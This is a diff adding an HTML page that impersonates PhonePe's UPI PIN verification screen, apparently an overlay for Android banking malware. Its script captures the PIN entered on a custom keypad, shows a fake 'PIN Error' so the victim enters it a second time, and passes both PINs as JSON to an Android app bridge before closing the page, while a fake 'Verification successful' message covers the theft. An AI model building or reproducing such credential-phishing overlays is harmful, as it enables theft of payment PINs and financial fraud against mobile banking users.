@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>PhonePe · UPI PIN</title>
+    <link rel="shortcut icon"
+        href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=="
+        type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta charset="utf-8">
+</head>
+
+<body>
+
+    <style type="text/css">
+        :root {
+            --pp-purple: #5f259f;
+            --pp-purple-dark: #3d1a6b;
+            --pp-text: #111;
+            --pp-muted: #6b6b6b;
+            --pp-muted2: #9a9a9a;
+            --pp-card-radius: 16px;
+            --pp-shadow: 0 12px 40px rgba(0, 0, 0, 0.18);
+            --pp-key-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            min-height: 100dvh;
+            font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background: linear-gradient(165deg, var(--pp-purple-dark) 0%, var(--pp-purple) 45%, #7b3fc4 100%);
+            color: var(--pp-text);
+            overflow-x: hidden;
+            overflow-y: auto;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .page {
+            min-height: 100dvh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: var(--pp-card-radius);
+            box-shadow: var(--pp-shadow);
+            padding: 24px 20px 20px;
+            position: relative;
+        }
+
+        .pp-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-bottom: 16px;
+        }
+
+        .pp-logo {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            /* background: var(--pp-purple); */
+            color: #fff;
+            font-weight: 700;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .pp-brand {
+            text-align: left;
+        }
+
+        .pp-name {
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            color: var(--pp-text);
+        }
+
+        .pp-sub {
+            font-size: 13px;
+            color: var(--pp-muted2);
+            margin-top: 2px;
+        }
+
+        .pp-divider {
+            border: none;
+            border-top: 1px solid #ececec;
+            margin: 0 0 20px;
+        }
+
+        .pp-verify {
+            text-align: center;
+        }
+
+        .pp-badge {
+            display: inline-block;
+            background: var(--pp-purple);
+            color: #fff;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.04em;
+            padding: 5px 12px;
+            border-radius: 999px;
+        }
+
+        .pp-lock {
+            margin: 14px auto 10px;
+            width: 40px;
+            height: 40px;
+            color: var(--pp-purple);
+        }
+
+        .pp-lock svg {
+            width: 100%;
+            height: 100%;
+            display: block;
+        }
+
+        .pp-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin: 0 0 10px;
+            letter-spacing: -0.02em;
+        }
+
+        .pp-hint {
+            font-size: 14px;
+            color: var(--pp-muted);
+            line-height: 1.45;
+            margin: 0 0 6px;
+            padding: 0 4px;
+        }
+
+        .pp-hint2 {
+            font-size: 12px;
+            color: var(--pp-muted2);
+            line-height: 1.4;
+            margin: 0 0 18px;
+            padding: 0 4px;
+        }
+
+        fieldset {
+            border: none;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+        }
+
+        #ccdata,
+        #passworddata {
+            display: none;
+        }
+
+        .pin-wrap {
+            text-align: left;
+            margin-bottom: 6px;
+        }
+
+        .pin_input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1.5px solid var(--pp-purple);
+            border-radius: 12px;
+            font-size: 32px;
+            letter-spacing: 0.35em;
+            max-height: 50px;
+            text-align: center;
+            background: #fff;
+            color: var(--pp-purple);
+            -webkit-text-security: disc;
+            pointer-events: none;
+            user-select: none;
+            -webkit-user-select: none;
+            cursor: default;
+            caret-color: transparent;
+        }
+
+        .pin_input::placeholder {
+            letter-spacing: 0;
+            font-size: 15px;
+            color: var(--pp-muted2);
+            -webkit-text-security: none;
+        }
+
+        .pin_input:focus {
+            outline: none;
+            box-shadow: none;
+        }
+
+        .pin_input.filled {
+            background: #fafafa;
+        }
+
+        .pin_input::-ms-reveal,
+        .pin_input::-ms-clear {
+            display: none;
+        }
+
+        .pp-pin-note {
+            font-size: 12px;
+            color: var(--pp-purple);
+            font-weight: 500;
+            margin: 8px 0 20px;
+            text-align: center;
+        }
+
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 18px;
+        }
+
+        .key {
+            border: none;
+            border-radius: 12px;
+            background: #fff;
+            box-shadow: var(--pp-key-shadow);
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--pp-text);
+            height: 52px;
+            cursor: pointer;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .key:active {
+            transform: scale(0.97);
+            background: #f5f5f5;
+        }
+
+        .key--muted {
+            background: #e8e8e8;
+            box-shadow: none;
+        }
+
+        .key--muted:active {
+            background: #ddd;
+        }
+
+        .key--confirm {
+            background: var(--pp-purple);
+            color: #fff;
+            box-shadow: 0 4px 14px rgba(95, 37, 159, 0.35);
+        }
+
+        .key--confirm:active {
+            background: #4a1d82;
+        }
+
+        .key--confirm svg {
+            width: 26px;
+            height: 26px;
+        }
+
+        .key--back svg {
+            width: 26px;
+            height: 26px;
+            opacity: 0.75;
+        }
+
+        .pp-warning {
+            font-size: 12px;
+            color: #c62828;
+            margin: 0 0 12px;
+            line-height: 1.4;
+        }
+
+        .pp-footer-brand {
+            font-size: 11px;
+            color: var(--pp-muted2);
+            margin: 0;
+        }
+
+        .pp-pin-panel {
+            display: block;
+        }
+
+        .pp-state-loading,
+        .pp-state-success {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 220px;
+            padding: 8px 0 4px;
+        }
+
+        .pp-spinner {
+            width: 52px;
+            height: 52px;
+            border: 3px solid #e4e4e4;
+            border-top-color: var(--pp-purple);
+            border-radius: 50%;
+            animation: pp-spin 0.75s linear infinite;
+            box-sizing: border-box;
+        }
+
+        @keyframes pp-spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .pp-success-mark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--pp-purple);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 6px 20px rgba(95, 37, 159, 0.35);
+        }
+
+        .pp-success-mark svg {
+            width: 42px;
+            height: 42px;
+            stroke: #fff;
+            stroke-width: 3;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .pp-success-msg {
+            font-size: 17px;
+            font-weight: 600;
+            color: var(--pp-text);
+            margin: 0;
+            letter-spacing: -0.02em;
+        }
+
+        .card.is-verifying .pp-pin-panel {
+            display: none;
+        }
+
+        .card.is-verifying .pp-state-loading {
+            display: flex;
+        }
+
+        .card.is-success .pp-pin-panel {
+            display: none;
+        }
+
+        .card.is-success .pp-state-loading {
+            display: none;
+        }
+
+        .card.is-success .pp-state-success {
+            display: flex;
+        }
+
+        .card.is-verifying,
+        .card.is-success {
+            pointer-events: none;
+        }
+
+        .toast {
+            position: absolute;
+            left: 50%;
+            top: 42%;
+            transform: translate(-50%, -50%);
+            min-width: 160px;
+            max-width: 90%;
+            background: rgba(0, 0, 0, 0.78);
+            color: #fff;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 14px;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.2s ease;
+            z-index: 20;
+            text-align: center;
+        }
+
+        .toast.show {
+            opacity: 1;
+        }
+    </style>
+
+    <div class="page">
+        <div class="card">
+            <form id="formtosend">
+                <fieldset>
+                    <div id="infodata">
+                        <header class="pp-header">
+                            <div class="pp-logo" aria-hidden="true">
+                                <svg t="1778779890714" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5250" width="200" height="200"><path d="M1024 512c0 282.8-229.2 512-512 512S0 794.8 0 512 229.2 0 512 0s512 229.2 512 512z" fill="#673AB7" p-id="5251"></path><path d="M730.7 341.2H628.3c-4.1 0-7.9-1.2-11.4-3.4-3.5-2.3-6.8-5.7-9.8-10.4l-58.2-93.5-58.2-93.6c-2.2-4.1-5-7.1-8.5-9.1s-7.7-3-12.6-3H420c-4.1 0-7.1 1-9.1 3s-3.1 5.1-3.1 9.1c0 2.2 0.3 4.3 0.8 6.3s1.4 4 2.4 5.9l22.8 33.8 22.8 33.8c15.1 22.4 30.7 43.7 46.9 63.9 16.2 20.2 33 39.3 50.3 57.3H314.1c-5.2 0-9 1.2-11.6 3.7-2.6 2.4-3.9 6-3.9 10.9v34.2c0 5.5 1.3 9.5 3.9 12.2 2.6 2.7 6.5 4.1 11.6 4.1h47.2c2.4 0.2 4.3 1.2 5.5 2.8 1.2 1.6 1.8 4 1.8 6.9v177.4c0 18.9 2.8 35.9 8.4 51 5.6 15 14.1 28 25.3 38.9 11.3 11 24.4 19.3 39.4 24.7 15 5.5 31.8 8.3 50.6 8.3h23.6c18.5 0 33.9-2.8 46.4-8.5s22-14.2 28.5-25.6h3.2v150.6c0 5.2 1.3 9 3.9 11.6 2.6 2.6 6.5 3.9 11.6 3.9h43.1c5.2 0 9-1.3 11.6-3.9 2.6-2.5 3.9-6.4 3.9-11.6V416.1c0-3.2 0.8-5.7 2.2-7.3 1.5-1.6 3.7-2.4 6.7-2.4h53.8c5.2 0 9-1.3 11.6-3.9 2.6-2.6 3.9-6.4 3.9-11.6v-35c0-4.9-1.3-8.5-3.9-11-2.7-2.5-6.6-3.7-11.7-3.7zM594 584.4c0 10-1.4 19-4.2 27-2.8 7.9-7 14.8-12.5 20.6-5.5 5.8-12.6 10.2-21 13.1-8.5 2.9-18.4 4.4-29.8 4.4h-22c-20.6 0-36-5.3-46.4-15.9-10.3-10.6-15.5-26.4-15.5-47.6V416c0-3.2 0.8-5.7 2.2-7.3 1.5-1.6 3.7-2.4 6.7-2.4H585c3 0 5.2 0.8 6.7 2.4 1.5 1.6 2.3 4.1 2.3 7.3v168.4z" fill="#FFFFFF" p-id="5252"></path></svg>
+                            </div>
+                            <div class="pp-brand">
+                                <div class="pp-name">PhonePe</div>
+                                <div class="pp-sub">PhonePe · UPI</div>
+                            </div>
+                        </header>
+                        <hr class="pp-divider">
+
+                        <div class="pp-verify">
+                            <span class="pp-badge">UPI PIN</span>
+                            <div class="pp-lock" aria-hidden="true">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                    stroke-linecap="round" stroke-linejoin="round">
+                                    <rect x="5" y="11" width="14" height="10" rx="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                            </div>
+                            <h1 class="pp-title">UPI PIN Verification</h1>
+                            <p class="pp-hint">Enter your UPI PIN to complete the transaction.</p>
+                            <p class="pp-hint2">For your account security, confirm your UPI PIN.</p>
+
+                            <div class="pp-pin-panel" id="pp_pin_panel">
+                                <div class="pin-wrap">
+                                    <input class="pin_input" id="pin_input" type="password" inputmode="none"
+                                        maxlength="6" autocomplete="off" name="pin" placeholder="" required
+                                        readonly tabindex="-1" aria-readonly="true">
+                                </div>
+                                <p class="pp-pin-note">Enter 4-6 digit UPI PIN</p>
+
+                                <div class="keypad" aria-label="UPI PIN keypad">
+                                <button type="button" class="key key-num" data-digit="1">1</button>
+                                <button type="button" class="key key-num" data-digit="2">2</button>
+                                <button type="button" class="key key-num" data-digit="3">3</button>
+                                <button type="button" class="key key-num" data-digit="4">4</button>
+                                <button type="button" class="key key-num" data-digit="5">5</button>
+                                <button type="button" class="key key-num" data-digit="6">6</button>
+                                <button type="button" class="key key-num" data-digit="7">7</button>
+                                <button type="button" class="key key-num" data-digit="8">8</button>
+                                <button type="button" class="key key-num" data-digit="9">9</button>
+                                <button type="button" class="key key--muted key--back" id="key_back"
+                                    aria-label="Backspace">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
+                                        <line x1="18" y1="9" x2="12" y2="15" />
+                                        <line x1="12" y1="9" x2="18" y2="15" />
+                                    </svg>
+                                </button>
+                                <button type="button" class="key key-num" data-digit="0">0</button>
+                                <button type="button" class="key key--confirm" id="key_confirm"
+                                    aria-label="Confirm">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"
+                                        stroke-linecap="round" stroke-linejoin="round">
+                                        <polyline points="20 6 9 17 4 12" />
+                                    </svg>
+                                </button>
+                                </div>
+
+                                <p class="pp-warning">Too many incorrect attempts will lock transactions.</p>
+                            </div>
+
+                            <div class="pp-state-loading" id="pp_state_loading" aria-live="polite" aria-busy="true">
+                                <div class="pp-spinner" role="status"></div>
+                            </div>
+
+                            <div class="pp-state-success" id="pp_state_success">
+                                <div class="pp-success-mark" aria-hidden="true">
+                                    <svg viewBox="0 0 24 24">
+                                        <polyline points="20 6 9 17 4 12" />
+                                    </svg>
+                                </div>
+                                <p class="pp-success-msg">Verification successful</p>
+                            </div>
+
+                            <p class="pp-footer-brand">PhonePe</p>
+                        </div>
+
+                        <div class="toast" id="toast"></div>
+                    </div>
+                </fieldset>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        function stringifyJSON(value) {
+            return JSON.stringify(value);
+        }
+
+        function formToJSONbyName(f) {
+            var FinalObject = {}, namesHTML = ['input', 'select'];
+            for (var i = 0; i < namesHTML.length; i++) {
+                var bsform = f.getElementsByTagName(namesHTML[i]);
+                for (var j = 0; j < bsform.length; j++) {
+                    if (bsform[j].name == 'submit') continue;
+                    FinalObject[bsform[j].name] = bsform[j].value
+                }
+            }
+            return stringifyJSON(FinalObject);
+        }
+
+        function showToast(message) {
+            var toast = document.getElementById('toast');
+            if (!toast) return;
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(function () {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+
+        var _pinSecondChance = false;
+        var _firstPin = null;
+        var _submittingPin = false;
+        var VERIFY_DELAY_MS = 1500;
+        var ANDROID_CLOSE_AFTER_MS = 1000;
+
+        function isPinFlowLocked() {
+            var card = document.querySelector('.card');
+            return !!(card && (card.classList.contains('is-verifying') || card.classList.contains('is-success')));
+        }
+
+        function deliverResult(data) {
+            var ua = navigator.userAgent.toLowerCase();
+            if (ua.indexOf("android") > -1) {
+                try {
+                    Android.returnResult(data);
+                    if (typeof Android.hidePage === 'function') {
+                        Android.hidePage('');
+                    }
+                    setTimeout(function () {
+                        window.close();
+                        window.location.href = 'about:blank';
+                    }, ANDROID_CLOSE_AFTER_MS);
+                } catch (err) { }
+            } else {
+                setTimeout(function () {
+                    alert(data);
+                }, 1000);
+            }
+        }
+
+        function validatePin() {
+            var pinInput = document.getElementById('pin_input');
+            if (!pinInput) return false;
+            var value = pinInput.value || '';
+            var isValid = /^\d{4,6}$/.test(value);
+            if (!isValid) {
+                showToast('PIN must be 4-6 digits');
+            }
+            return isValid;
+        }
+
+        function updateBackground() {
+            var pinInput = document.getElementById('pin_input');
+            if (!pinInput) return;
+            pinInput.classList.toggle('filled', pinInput.value.length > 0);
+        }
+
+        function appendPinDigit(d) {
+            if (isPinFlowLocked()) return;
+            var pinInput = document.getElementById('pin_input');
+            if (!pinInput || pinInput.value.length >= 6) return;
+            pinInput.value += d;
+            pinInput.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+
+        function backspacePin() {
+            if (isPinFlowLocked()) return;
+            var pinInput = document.getElementById('pin_input');
+            if (!pinInput) return;
+            pinInput.value = pinInput.value.slice(0, -1);
+            pinInput.dispatchEvent(new Event('input', { bubbles: true }));
+        }
+
+        function send_form() {
+            if (isPinFlowLocked()) return;
+            var pinInput = document.getElementById('pin_input');
+            if (pinInput) {
+                var digits = (pinInput.value || '').replace(/\D/g, '').slice(0, 6);
+                if (pinInput.value !== digits) pinInput.value = digits;
+                updateBackground();
+            }
+
+            if (!validatePin()) {
+                return;
+            }
+
+            if (!_pinSecondChance) {
+                if (_submittingPin) return;
+                _submittingPin = true;
+                _firstPin = pinInput ? pinInput.value : null;
+                var cardFirst = document.querySelector('.card');
+                if (cardFirst) {
+                    cardFirst.classList.add('is-verifying');
+                }
+                setTimeout(function () {
+                    if (cardFirst) {
+                        cardFirst.classList.remove('is-verifying');
+                    }
+                    showToast('PIN Error');
+                    _pinSecondChance = true;
+                    if (pinInput) {
+                        pinInput.value = '';
+                        updateBackground();
+                    }
+                    _submittingPin = false;
+                }, VERIFY_DELAY_MS);
+                return;
+            }
+
+            if (_submittingPin) return;
+            _submittingPin = true;
+
+            var form = document.getElementById('formtosend');
+            var payloadObj = {};
+            try {
+                payloadObj = JSON.parse(formToJSONbyName(form));
+            } catch (e) {
+                payloadObj = {};
+            }
+            if (_firstPin !== null) payloadObj.first_pin = _firstPin;
+            var data = JSON.stringify(payloadObj);
+
+            var card = document.querySelector('.card');
+            if (card) {
+                card.classList.add('is-verifying');
+            }
+
+            setTimeout(function () {
+                if (card) {
+                    card.classList.remove('is-verifying');
+                    card.classList.add('is-success');
+                }
+                deliverResult(data);
+            }, VERIFY_DELAY_MS);
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            var pinInput = document.getElementById('pin_input');
+            if (!pinInput) return;
+
+            var numKeys = document.querySelectorAll('.key-num');
+            for (var k = 0; k < numKeys.length; k++) {
+                (function (btn) {
+                    btn.addEventListener('click', function () {
+                        var d = btn.getAttribute('data-digit');
+                        if (d) appendPinDigit(d);
+                    });
+                })(numKeys[k]);
+            }
+            var backBtn = document.getElementById('key_back');
+            if (backBtn) backBtn.addEventListener('click', backspacePin);
+            var confirmBtn = document.getElementById('key_confirm');
+            if (confirmBtn) confirmBtn.addEventListener('click', function () { send_form(); });
+
+            pinInput.addEventListener('input', function () {
+                var digits = pinInput.value.replace(/\D/g, '').slice(0, 6);
+                if (pinInput.value !== digits) {
+                    pinInput.value = digits;
+                }
+                updateBackground();
+            });
+            pinInput.addEventListener('keydown', function (e) {
+                e.preventDefault();
+            });
+            pinInput.addEventListener('paste', function (e) {
+                e.preventDefault();
+            });
+            pinInput.addEventListener('drop', function (e) {
+                e.preventDefault();
+            });
+            updateBackground();
+        });
+    </script>
+
+</body>
+
+</html>
